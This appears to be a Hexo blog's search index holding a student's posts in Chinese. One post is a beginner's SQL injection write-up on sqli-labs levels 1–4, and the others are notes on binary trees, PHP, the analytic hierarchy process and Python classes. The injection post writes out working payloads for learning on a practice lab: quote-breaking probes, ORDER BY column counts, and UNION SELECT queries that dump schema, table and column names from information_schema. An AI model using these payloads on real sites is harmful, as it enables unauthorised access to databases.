<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Hello World</title>
    <url>/2022/11/09/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>enhenng-first-blog----sql注入(持续更新）</title>
    <url>/2022/11/09/enhenng-first-blog-sql%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<p>Hello，我是enhenng,在历经了长达三周的删删改改重建之后，我的blog终于搭建成功啦。</p>
<p>本文目标：学习sql注入，掌握基本的注入知识<br>基础知识：</p>
<h1 id="一：sql注入的基础知识："><a href="#一：sql注入的基础知识：" class="headerlink" title="一：sql注入的基础知识："></a>一：sql注入的基础知识：</h1><h2 id="sql的类型"><a href="#sql的类型" class="headerlink" title="sql的类型"></a>sql的类型</h2><ol>
<li>get型注入：直接在URL中进行sql注入（例如第一题）</li>
</ol>
<h2 id="需要使用要的一些函数"><a href="#需要使用要的一些函数" class="headerlink" title="需要使用要的一些函数"></a>需要使用要的一些函数</h2><h1 id="二：sqli-labs闯关"><a href="#二：sqli-labs闯关" class="headerlink" title="二：sqli-labs闯关"></a>二：sqli-labs闯关</h1><p><strong>第一关：基于错误的get型注入（字符型）</strong>（嗯…啥是基于错误？）<br>首先判断注入类型—–&gt;字符型or数字型<br>如何判断注入类型<a href="https://www.jianshu.com/p/5edd7a58a69e" title="参考文章">（参考文章）</a>  （这个很重要）<br>按照文章所示，尝试一下，发现在输入?id&#x3D;1’ and ‘1’&#x3D;’2’–+（这道题如果不加上–+，在回显时会出现报错）（想插一个图片来着，没找到合适的方法，算了）没有回显，是字符型注入。<br>尝试获取列数（在后面的union中需要保证前后队列书相同）</p>
<blockquote>
<p>?id&#x3D;1’ order by 3–+   —-&gt;回显正常<br>?id&#x3D;1’ order by 4–+   —-&gt;unkown column ‘4’ in ‘order clause’    </p>
</blockquote>
<p>即共有3列，下面才是重点<br>在获取敏感信息前要确定什么才是回显的内容  ?id&#x3D;-1’ union select 1,2,3(得到回显的内容）<br><strong>查询数据库信息</strong>  </p>
<blockquote>
<p>union select 1,database(),version<br>union select 1,1,SCHEMA_NAME from information_schema.SCHEMATA（暴露数据库名称）（在这之前需要了解一下数据库的结构）&#x2F;&#x2F;这个命令存在着一个问题<br>，只暴露所找的第一个表名称）<br>解决：union select 1,1,(SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata)–+<br>union select 1,1,TABLE_NAME（表名）,TABLE_SCHEMA（表所在数据库）from information_schema.TABLES（暴露数据库中表的名称）  &#x2F;&#x2F;这个命令存在着一个问题<br>，只暴露所找的第一个表名称）<br>union select 1,1,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables *where table_schema&#x3D;’mysql’*)–+(MYSQL查询不区分大小写，但其库名表名等是严格区分大小写的）<br>union select 1,1,(select group_concat(column_name) from information_schema.columns where table_name &#x3D; “CHARACTER_SETS”)–+  </p>
</blockquote>
<p>这里的命令可以根据所想要查找的内容任意改变。  </p>
<p><strong>第二关（数字型）</strong><br>与第一关相同，首先判断sql注入的类型为数字型<br>按照第一关的步骤，依次获得数据库的名称，数据库中表的名称，列的名称等等  </p>
<p><strong>第三关</strong>（这一关与前两关的区别在于需要根据回显错误的内容猜测输入与原句的关系）<br>尝试猜测过程：  </p>
<ol>
<li>输入?id&#x3D;1 回显正常  </li>
<li>输入?id&#x3D;1’ 回显错误   You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1’’) LIMIT 0,1’ at line 1(即’’1’’)LIMIT 0,1’为url真正输入的)  </li>
<li>易看出应该是需要输入’)  </li>
<li>尝试输入?id&#x3D;1’)–+回显正常，则得出需要输入的东西</li>
</ol>
<p>但是这块还有一点我没能搞明白，为什么一定要按照?id&#x3D;1’) order by 1–+输入，而不能按照?id&#x3D;1’ order by 1)–+输入<br>之后，按照第一题依次得到即可以</p>
<p><strong>第四关</strong>(什么鬼，为什么我的第四关不报错）</p>
]]></content>
  </entry>
  <entry>
    <title>数据结构与算法分析</title>
    <url>/2022/11/18/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E9%A2%84%E7%AE%97%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>虽然我很不想学习算法相关的知识，但我相信这块应该是有用的，还是努力学一下吧，万一我很喜欢呢~~~~</p>
<h1 id="树"><a href="#树" class="headerlink" title="树"></a>树</h1><p>关于树以及二叉树的基本的定义不想写了，直接从二叉树的存储开始吧  </p>
<h2 id="二叉树的存储方式"><a href="#二叉树的存储方式" class="headerlink" title="二叉树的存储方式"></a>二叉树的存储方式</h2><p><strong>线性存储</strong><br>将二叉树赋予序号1,2,3…并将其按照顺序依次存储于数组之中—-&gt;这样会导致非完全二叉树的存储产生浪费——&gt;链式存储<br><strong>链式存储</strong><br>与线性表等完全类似<br>typedef struct Node{<br>     datatype data;<br>     struct Node *Ichild;<br>     struct Node *Rchild;<br>}Bigtree;<br>(当然，如果你愿意，大可以再加上一个parent指针，指向其双亲结点）</p>
<h2 id="二叉树的遍历和线索化"><a href="#二叉树的遍历和线索化" class="headerlink" title="二叉树的遍历和线索化"></a>二叉树的遍历和线索化</h2><p><strong>二叉树的遍历</strong></p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2022/12/16/PHP%E8%AF%AD%E8%A8%80/</url>
    <content><![CDATA[<h1 id="PHP语言学习"><a href="#PHP语言学习" class="headerlink" title="PHP语言学习"></a>PHP语言学习</h1><h2 id="PHP中回显和打印"><a href="#PHP中回显和打印" class="headerlink" title="PHP中回显和打印"></a>PHP中回显和打印</h2>]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2022/12/11/New%20Document/</url>
    <content><![CDATA[<h1 id="层次分析法"><a href="#层次分析法" class="headerlink" title="层次分析法"></a>层次分析法</h1><p>解决评价类问题：  </p>
<ol>
<li>我们评价的目标是什么？  </li>
<li>我们为了达到这个目标有几个可选的方案  </li>
<li>评价的准则或者说指标是什么？</li>
</ol>
<p>指标权重—&gt;判断矩阵<br>判断矩阵可能出现一个错误：及两个之间的变量关系与第三者之间的变量关系不一致（一致矩阵）<br><strong>在使用判断矩阵之前必须对其进行一致性检验</strong><br>一致性判断过程：
 </p>
]]></content>
  </entry>
  <entry>
    <title>python学习笔记</title>
    <url>/2022/12/24/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="编程的两大思想（我还是不能明白）"><a href="#编程的两大思想（我还是不能明白）" class="headerlink" title="编程的两大思想（我还是不能明白）"></a>编程的两大思想（我还是不能明白）</h1><p>1.面向过程：事物比较简单，可以用线性的思维去解决<br>2.面向对象：事物比较复杂，使用简单的线性思维无法解决</p>
<h2 id="类与对象"><a href="#类与对象" class="headerlink" title="类与对象"></a>类与对象</h2><h3 id="类："><a href="#类：" class="headerlink" title="类："></a>类：</h3><p>数据类型：不同的数据类型属于不同的类<br>对象：9,100等实体的例子<br><strong>类的创建：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span>: <span class="comment">#Student是类名，可以由一个或多个单词组成，首字母大写，其余小写</span></span><br><span class="line"> <span class="keyword">pass</span>  <span class="comment">#表示先占一个位置</span></span><br></pre></td></tr></table></figure>
<p> <strong>类的组成：</strong></p>
<ul>
<li>类属性</li>
<li>实例方法</li>
<li>静态方法</li>
<li>类方法</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span>:</span><br><span class="line">    native_place=<span class="string">&#x27;吉林&#x27;</span>  <span class="comment">#类属性（直接写在类里的变量）</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,name,age</span>):  <span class="comment">#name,age是实例属性</span></span><br><span class="line">        self.name=name</span><br><span class="line">        self.age=age</span><br><span class="line">    <span class="comment">#实例方法（在类之外定义的是函数，内部定义的是实例方法）</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">info</span>(<span class="params">self</span>):</span><br><span class="line">       <span class="built_in">print</span>(<span class="string">&#x27;我的名字叫：&#x27;</span>,self.name,<span class="string">&#x27;年龄是：&#x27;</span>，self.age)</span><br><span class="line">    <span class="comment">#静态方法</span></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sm</span>():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;静态方法&#x27;</span>)</span><br><span class="line">    <span class="comment">#类方法</span></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">cm</span>(<span class="params">cls</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;静态方法&#x27;</span>)</span><br><span class="line">```    </span><br><span class="line"><span class="comment">### 对象 </span></span><br><span class="line">```python</span><br><span class="line"><span class="comment">#创建Student类中的对象</span></span><br><span class="line">stu1=Student(<span class="string">&#x27;张三&#x27;</span>，<span class="number">20</span>)</span><br><span class="line">stu1.info()  <span class="comment">#这个就是调用info函数   或者也可以是Student.info(stu1)</span></span><br></pre></td></tr></table></figure>
<h2 id="关于类属性，静态方法与类方法-我还是不明白三种之间到底有什么区别"><a href="#关于类属性，静态方法与类方法-我还是不明白三种之间到底有什么区别" class="headerlink" title="关于类属性，静态方法与类方法(我还是不明白三种之间到底有什么区别)"></a>关于类属性，静态方法与类方法(我还是不明白三种之间到底有什么区别)</h2><p>类属性:@property<br>把类的一些属性封装，类似于数据类型，比如这个类属性为学生等等</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span>():</span><br><span class="line">    age=<span class="number">18</span></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">printmessage</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;hello&#x27;</span>)</span><br><span class="line">s1=Student()</span><br><span class="line">s1.printmessage</span><br></pre></td></tr></table></figure>
<hr>
<p>静态方法<br>相当于在类里面调用的一个函数 </p>
<p>&#96;&#96;&#96;python<br>class Student():<br>    age&#x3D;18<br>    @staticmethod<br>    def printmessage():<br>        print(Student.age)
    </p>
]]></content>
  </entry>
</search>
